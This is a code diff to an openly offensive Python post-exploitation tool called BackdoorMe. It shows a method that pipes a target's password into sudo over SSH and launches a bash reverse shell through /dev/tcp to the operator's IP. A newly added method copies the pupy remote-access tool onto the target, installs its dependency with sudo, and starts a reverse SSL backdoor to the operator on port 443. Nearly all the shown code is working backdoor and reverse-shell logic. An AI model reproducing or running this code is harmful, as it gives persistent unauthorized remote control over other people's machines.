@@ -125,8 +125,21 @@ class BackdoorMe(cmd.Cmd):
 
         raw_input("Please enter the following command: nc -v -n -l -p 53923 in another shell to connect.")
         print("Initializing backdoor...")
-        self.curtarget.ssh.exec_command("echo " +  t.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/53923 0>&1")
+        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/53923 0>&1")
         print(GOOD + "Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + t.pword)
+
+    def do_pupy(self, args):
+	t=self.get_target(args)
+	if not t.is_open:
+	    print BAD + "No SSH connection to target. Run \"open\" to start a connection."
+            return
+	self.curtarget.ssh.exec_command('rm -r pupy')
+	self.curtarget.scpFiles(self, 'pupy', True)
+	self.curtarget.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
+	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
+	raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
+	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.localIP + ":443")
+	raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
 
     def do_python(self, args):
         t = self.get_target(args)
